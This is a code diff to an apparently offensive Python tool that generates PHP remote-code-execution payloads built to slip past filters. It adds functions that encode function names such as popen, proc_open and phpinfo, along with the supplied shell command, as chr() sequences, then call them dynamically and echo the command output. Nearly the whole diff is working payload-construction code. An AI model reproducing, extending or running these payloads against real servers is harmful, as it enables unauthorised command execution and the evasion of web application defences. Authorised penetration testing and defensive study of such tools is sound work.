@@ -84,6 +84,38 @@ def _build_proc_open_payload(command: str):
     )
 
 
+def _build_chr_exec_payload(func: str, command: str):
+    chr_func = utils.generate_php_chr(func)
+    chr_arg = utils.generate_php_chr(command)
+    return f"$_={chr_func};$_({chr_arg});"
+
+
+def _build_popen_chr_payload(command: str):
+    chr_func = utils.generate_php_chr("popen")
+    chr_arg = utils.generate_php_chr(command)
+    return (
+        f"$__f={chr_func};"
+        f"$__h=$__f({chr_arg},'r');"
+        "if($__h){echo stream_get_contents($__h);pclose($__h);}"
+    )
+
+
+def _build_proc_open_chr_payload(command: str):
+    chr_func = utils.generate_php_chr("proc_open")
+    chr_arg = utils.generate_php_chr(command)
+    return (
+        f"$__f={chr_func};"
+        "$__spec=[0=>['pipe','r'],1=>['pipe','w'],2=>['pipe','w']];"
+        f"$__p=$__f({chr_arg},$__spec,$__pipes);"
+        "if(is_resource($__p)){"
+        "echo stream_get_contents($__pipes[1]);"
+        "if(isset($__pipes[0])){fclose($__pipes[0]);}"
+        "if(isset($__pipes[1])){fclose($__pipes[1]);}"
+        "if(isset($__pipes[2])){fclose($__pipes[2]);}"
+        "proc_close($__p);}"
+    )
+
+
 def _generate_php_rce_payloads(command: str, php_version: float):
     payloads = []
     payloads.extend(_render_backtick_payloads(command))
@@ -107,10 +139,14 @@ def _generate_php_rce_payloads(command: str, php_version: float):
         if inc_func_code and xor_arg:
             payloads.append(f"{inc_func_code};$_____({xor_arg});")
 
+        payloads.append(_build_chr_exec_payload(func, command))
+
     if "popen" in bypass_data.PHP_EXEC_WRAPPERS:
         payloads.append(_build_popen_payload(command))
+        payloads.append(_build_popen_chr_payload(command))
     if "proc_open" in bypass_data.PHP_EXEC_WRAPPERS:
         payloads.append(_build_proc_open_payload(command))
+        payloads.append(_build_proc_open_chr_payload(command))
 
     return payloads
 
@@ -204,6 +240,9 @@ def generate_candidates(options: BypassOptions):
             if options.php_version >= 7.0:
                 not_code = utils.generate_php_not("phpinfo")
                 payloads.append(f"{not_code}();")
+
+            chr_phpinfo = utils.generate_php_chr("phpinfo")
+            payloads.append(f"$_={chr_phpinfo};$_();")
         else:
             payloads.extend(_generate_php_rce_payloads(target_cmd, options.php_version))
 
